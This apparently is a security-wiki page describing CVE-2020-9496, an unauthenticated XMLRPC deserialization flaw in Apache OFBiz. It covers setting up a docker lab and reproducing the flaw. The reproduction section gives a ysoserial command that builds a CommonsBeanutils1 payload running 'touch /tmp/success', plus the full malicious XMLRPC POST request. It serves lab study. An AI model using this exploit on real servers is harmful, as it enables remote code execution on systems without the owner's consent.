<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ofbiz/CVE-2020-9496/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Unsafe deserialization of XMLRPC arguments in ApacheOfBiz (CVE-2020-9496) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Unsafe deserialization of XMLRPC arguments in ApacheOfBiz (CVE-2020-9496)", url: "#_top", children: [
              {title: "Vulnerable environment", url: "#vulnerable-environment" },
              {title: "Vulnerability Reproduce", url: "#vulnerability-reproduce" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache OfBiz 反序列化命令执行漏洞（CVE-2020-9496）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../ntopng/CVE-2021-28073/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../ntopng/CVE-2021-28073/README.zh-cn/" class="btn btn-xs btn-link">
        ntopng权限绕过漏洞（CVE-2021-28073）
      </a>
    </div>
    
  </div>

    

    <h1 id="unsafe-deserialization-of-xmlrpc-arguments-in-apacheofbiz-cve-2020-9496">Unsafe deserialization of XMLRPC arguments in ApacheOfBiz (CVE-2020-9496)<a class="headerlink" href="#unsafe-deserialization-of-xmlrpc-arguments-in-apacheofbiz-cve-2020-9496" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Apache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.</p>
<p>OfBiz exposes an XMLRPC endpoint at <code>/webtools/control/xmlrpc</code>. This is an unauthenticated endpoint since authentication is applied on a per-service basis. However, the XMLRPC request is processed before authentication. As part of this processing, any serialized arguments for the remote invocation are deserialized, therefore if the classpath contains any classes that can be used as gadgets to achieve remote code execution, an attacker will be able to run arbitrary system commands on any OfBiz server with same privileges as the servlet container running OfBiz.</p>
<p>References:</p>
<ol>
<li><a href="https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz">https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz</a></li>
<li><a href="https://github.com/dwisiswant0/CVE-2020-9496">https://github.com/dwisiswant0/CVE-2020-9496</a></li>
<li><a href="https://www.cnblogs.com/ph4nt0mer/p/13576739.html">https://www.cnblogs.com/ph4nt0mer/p/13576739.html</a></li>
</ol>
<h2 id="vulnerable-environment">Vulnerable environment<a class="headerlink" href="#vulnerable-environment" title="Permanent link">&para;</a></h2>
<p>Executing following command to start an Apache OfBiz (17.12.01):</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After a short wait, you can see the login page at <code>https://localhost:8443/accounting</code>.</p>
<h2 id="vulnerability-reproduce">Vulnerability Reproduce<a class="headerlink" href="#vulnerability-reproduce" title="Permanent link">&para;</a></h2>
<p>There is no error message in response by default, we can't reproduce the vulnerability using the POC of <a href="https://github.com/dwisiswant0/CVE-2020-9496">reference link 2</a>, so ask <a href="https://github.com/frohoff/ysoserial">ysoserial</a> for help.</p>
<p>Generate the CommonsBeanutils1 payload:</p>
<div class="highlight"><pre><span></span><code>java -jar ysoserial.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; | base64 | tr -d &quot;\n&quot;
</code></pre></div>
<p><img alt="" src="1.png" /></p>
<p>Replace the <code>[base64-payload]</code> and send the request:</p>
<div class="highlight"><pre><span></span><code>POST /webtools/control/xmlrpc HTTP/1.1
Host: your-ip
Content-Type: application/xml
Content-Length: 4093

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
        &lt;struct&gt;
          &lt;member&gt;
            &lt;name&gt;test&lt;/name&gt;
            &lt;value&gt;
              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;[base64-payload]&lt;/serializable&gt;
            &lt;/value&gt;
          &lt;/member&gt;
        &lt;/struct&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodCall&gt;
</code></pre></div>
<p><img alt="" src="2.png" /></p>
<p><code>touch /tmp/success</code> is succesful executing in the container:</p>
<p><img alt="" src="3.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache OfBiz 反序列化命令执行漏洞（CVE-2020-9496）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../ntopng/CVE-2021-28073/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../ntopng/CVE-2021-28073/README.zh-cn/" class="btn btn-xs btn-link">
        ntopng权限绕过漏洞（CVE-2021-28073）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>